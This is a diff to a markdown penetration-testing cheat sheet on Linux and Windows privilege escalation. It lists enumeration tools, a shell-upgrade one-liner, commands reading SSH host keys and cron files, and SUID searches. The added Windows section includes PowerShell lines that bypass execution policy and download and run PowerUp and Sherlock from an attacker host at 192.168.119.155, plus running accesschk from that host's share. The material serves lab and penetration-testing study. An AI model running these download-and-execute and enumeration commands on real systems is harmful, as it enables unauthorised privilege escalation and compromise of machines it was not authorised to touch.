@@ -8,8 +8,9 @@ image: https://i.kym-cdn.com/entries/icons/original/000/021/807/ig9OoyenpxqdCQyA
 
 # Privilege Escalation
 
+## Linux PrivEsc
 
-## Automated Scripts 
+### Linux - Automated Scripts 
 
 ````
 linPEAS.sh
@@ -19,7 +20,7 @@ unix-privesc-check
 metasploit: multi/recon/local_exploit_suggester
 ````
 
-## Interactive Shell 
+### Interactive Shell 
 
 ````
 python -c 'import pty;pty.spawn("/bin/bash");'  
@@ -37,7 +38,7 @@ stty rows \<> colums \<>
 ````
 
 
-## Application Config Files 
+### Application Config Files 
 
 ````
 cat /etc/syslog.conf
@@ -52,7 +53,7 @@ cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 ````
 
-## Cronjobs
+### Cronjobs
 
 ````
 crontab -l
@@ -70,7 +71,7 @@ cat /var/spool/cron/crontabs/root
 ls -al /var/cron.log - check timestamps 
 ````
 
-## Network
+### Linux - Network
 
 ````
 N
@@ -88,7 +89,7 @@ hostname
 dnsdomainname
 ````
 
-## SUID Files
+### SUID Files
 
 ````
 
@@ -105,7 +106,7 @@ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev
 find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
 ````
 
-## İnfo
+### İnfo
 
 ````
 id
@@ -154,3 +155,49 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ````
 
+## Windows PrivEsc
+
+### Windows - Automated Tools
+
+````
+Run winpeas 
+Run PowerUp.ps1
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"
+
+Run Sherlock.ps1
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"
+
+accesschk.exe /accepteula -wvu
+Folder Perms 
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\
+File Perms 
+\\192.168.119.155\test\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\*.*
+\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*
+
+Run JAWS
+
+# Executables  
+WinPEAS.exe /.bat * 
+Seatbelt.exe 
+Watson.exe * 
+Sharpup.exe 
+windows-privesc-check2.exe --dump -G
+
+#Powershell 
+Sherlock.ps1 * 
+PowerUp.ps1 * 
+jaws-enumps1 * 
+
+
+#Other 
+Windows-exploit-suggester.py *
+Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github 
+
+MSF exploit suggester *
+In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel
+````
+
+### Win-Network
+
+````
